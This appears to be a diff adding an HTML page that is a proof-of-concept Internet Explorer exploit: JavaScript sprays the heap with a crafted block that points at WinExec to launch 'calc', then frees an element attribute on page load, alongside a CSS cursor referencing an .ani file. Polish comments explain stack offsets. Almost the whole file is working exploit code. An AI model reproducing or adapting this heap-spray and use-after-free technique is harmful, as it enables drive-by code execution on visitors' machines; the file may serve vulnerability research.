@@ -1,0 +1,72 @@
+<html>
+<meta id='set'>
+<script type="text/javascript">
+
+//%7374 %u6172 %u7420 %u6361 %u6c63 %u2e65 %u7865
+
+var hold = document.getElementById('set');
+
+//0A0A0A5C  66666666  ffff
+
+
+
+function heaps() {
+
+  CollectGarbage();
+
+  var lWinExec = unescape('%u32df');
+  var hWinExec = unescape(parent.window.call_me);
+
+  var code = unescape('%u0a3c%u0a0a') +  //0A0A0A3C - [ebp-28] - wskaznik do adresu WinExec
+             unescape('%u0a40%u0a0a') +  //[ebp-24] - wkaznk pCmd dla WinExec
+             lWinExec + hWinExec      +  //WinExec addr
+             unescape('%u6163%u636c') +  //calc
+             unescape('%u0000%u0000') +  //terminator
+             unescape('%uffff%uffff') +  //junks
+             unescape('%uffff%uffff') +
+             unescape('%uffff%uffff') +
+             unescape('%uffff%uffff') +
+             unescape('%uffff%uffff') +
+             unescape('%u6666%u6666') + 
+             unescape('%ubaba%ueeee') +
+             unescape('%ucece%ueeee') +
+             unescape('%u0001%u0000'); //[ebp + c] - flaga dla WinExec SW_NORMAL o ile sie nie myle
+
+    while (code.length < 100000)
+        code = code + code;
+
+    var block = code.substr(0, 64*1024/2);
+
+    for (i=0; i<14; i++) {
+        block += code.substr(0, 64*1024/2);
+    }
+
+    block += code.substr(0, (64*1024/2)-(38/2));
+
+    var heaps = new Array();
+
+    for (i=0; i<120; i++) {
+        heaps[i] = block.substr(0, block.length);
+    }
+
+
+  hold.setAttribute('skwokdowkdokwod',heaps);
+}
+
+function msg() {
+
+   hold.setAttribute('skwokdowkdokwod',null);
+   hold.removeAttribute('skwokdowkdokwod');
+   CollectGarbage();
+
+}
+
+heaps();
+
+</script>
+</meta>
+<body id='expme' style="CURSOR: url('original.ani')" onload='msg();'>
+
+
+</body>
+</html>
